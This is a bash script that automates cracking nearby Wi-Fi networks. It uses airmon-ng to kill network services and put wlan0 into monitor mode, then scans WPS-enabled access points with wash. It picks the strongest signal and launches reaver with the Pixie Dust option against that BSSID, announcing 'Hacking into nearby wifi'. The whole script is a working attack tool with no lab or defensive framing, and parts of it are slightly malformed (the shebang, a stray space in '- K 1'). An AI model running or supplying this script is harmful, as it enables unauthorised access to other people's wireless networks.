#/bin/bash



#text file code
filecode(){
echo "funf"
i=1
#line='a'
while read -ra line ; do
    if [ "$line" == "phy0" ]; then 
       cat test.txt | grep phy0 > test2.txt
       (head -n $i < test.txt | tail -1) > test1.txt  
    fi
i=$((i+1))    
done < test.txt
}
#$(gnome-terminal -- airmon-ng >> test.txt ; id >> test.txt )

#To Kill Network
mmc(){
    echo mmc-start
    sleep 1
    echo kill-network
    airmon-ng check kill
    sleep 1
    monitormodecode
    airmon-ng > test3.txt

}




#To Start Monitor Mode 
monitormodecode(){
echo "monitorfunc"
i=1
#line='a'
while read -a line ; do
    if [ "${line[1]}" == "wlan0" ]; then
    sleep 1
    echo starting monitoring mode 
    airmon-ng start ${line[1]}
    sleep 1
    fi
i=$((i+1))    
done < test1.txt
}




washcode(){
echo "Wash function"
while read -a line ; do
    if [ "${line[1]}" == "wlan0mon" ]; then
    echo "Capturing nearby wifi name"
    timeout 30s wash -i ${line[1]} > tgds1.txt
    echo "done"
    fi
  #done  
i=$((i+1))    
done < test3.txt
}



wtc(){

echo wtc-s2
sleep 2
echo wtc start
while read -a line ; do
    echo ${line[2]} | grep -Eo '[0-9]{1,4}' >>tgds2.txt
    done < tgds1.txt
    
sort  tgds2.txt    > s.txt
cat s.txt 
}

rc(){
head -n 1 s.txt > dbm.txt
while read -a dl ; do
  while read -a sl ; do
    if [ "${sl[2]}" == "-${dl[0]}" ]; then   
         echo iftrue
         echo ${sl[0]}
         echo ${sl[1]}
         echo ${sl[2]} 
        reaver -i wlan0mon -b ${sl[0]} -c ${sl[1]} -vv - K 1
    fi     
  done < tgds1.txt
done < dbm.txt

}





#Main function
$(gnome-terminal --command="bash -c 'airmon-ng > test.txt'")
echo 
sleep 1
echo filecode-fun
filecode
sleep 1
echo monitor-test
mmc
#monitormodecode
echo "Wash"
washcode
echo "wash-test-code"
wtc
echo "Hacking into nearby wifi"
rc


